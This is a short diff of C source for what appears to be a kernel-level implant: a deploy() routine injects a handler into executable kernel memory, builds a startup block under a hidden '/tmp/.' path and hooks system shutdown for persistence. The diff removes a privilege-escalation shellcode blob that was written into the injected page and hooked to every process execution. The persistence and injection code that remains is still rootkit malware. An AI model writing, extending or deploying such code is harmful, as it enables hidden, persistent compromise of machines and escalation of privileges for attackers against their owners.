@@ -26,13 +26,11 @@
 #include "self.h"
 #include "times.h"
 #include "rc.h"
-#include "sc_blob.h"
 #include "proxy_blob.h"
 #include "injector.h"
 #include "ehook.h"
 
 #define HANDLER_COPY 1024
-#define PRIVESC_OFF 0x500
 #define tmppathprefix "/tmp/."
 #define tmphex 16
 
@@ -104,24 +102,16 @@ int deploy (void)
 	char tmp[32];
 	tmp_path(tmp, sizeof(tmp));
 	const char* tmpname = tmp+strlen(tmppathprefix)-1;
-	char* opp = kern_getenv("GG_USER");
 	char rcblock[2048];
-	rcblock_build(rcblock, sizeof(rcblock), modulelen, tmp, tmpname, opp);
-	if (opp!=NULL)
-		freeenv(opp);
+	rcblock_build(rcblock, sizeof(rcblock), modulelen, tmp, tmpname);
 	const char* helperdata = rcblock;
 	size helperlen = strlen(helperdata);
 	size codelen = HANDLER_COPY;
-	
-	if (PRIVESC_OFF+sc_len>PAGE_SIZE) return (EINVAL);
 
 	error = injector_alloc(&code, INJECTOR_PMAP, PAGE_SIZE);
 	if (error!=0) return (error);
 
 	error = injector_write(&code, 0, (void*)persist_handler, codelen);
-	if (error!=0) return (error);
-	
-	error = injector_write(&code, PRIVESC_OFF, sc_bin, sc_len);
 	if (error!=0) return (error);
 
 	error = injector_rx(&code);
@@ -164,8 +154,6 @@ int deploy (void)
 	free(modulebuf, M_TEMP);
 
 	if (ehook_on_arg("shutdown_pre_sync", (void*)code.kva, ctx, SHUTDOWN_PRI_FIRST) == NULL)
-		return (ENOMEM);
-	if (ehook_on_arg("process_exec", (void*)(code.kva+PRIVESC_OFF), NULL, EVENTHANDLER_PRI_LAST) == NULL)
 		return (ENOMEM);
 
 	{
